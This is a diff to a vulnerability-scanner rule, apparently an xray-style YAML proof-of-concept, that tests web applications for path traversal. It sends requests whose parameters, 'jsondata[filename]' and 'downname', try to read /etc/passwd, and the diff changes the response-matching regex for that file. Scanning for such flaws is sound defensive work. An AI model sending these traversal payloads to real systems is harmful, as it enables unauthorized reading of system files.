@@ -31,7 +31,7 @@ rules:
         Content-Type: application/x-www-form-urlencoded; charset=UTF-8
       body: |
         jsondata[filename]=../../../../../../../etc/passwd
-    expression: response.status == 200 && response.body.bcontains(b"root:[x*]?:0:0:")
+    expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
   r4:
     request:
       cache: true
@@ -45,7 +45,7 @@ rules:
       path: /php/exportrecord.php?downname=../../../../../etc/passwd
       headers:
         Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-    expression: response.status == 200 && response.body.bcontains(b"root:[x*]?:0:0:") && response.body.bcontains(b"bin")
+    expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body) && response.body.bcontains(b"bin")
 expression: r1() || r2() || r3() || r4() || r5()
 detail:
   author: york
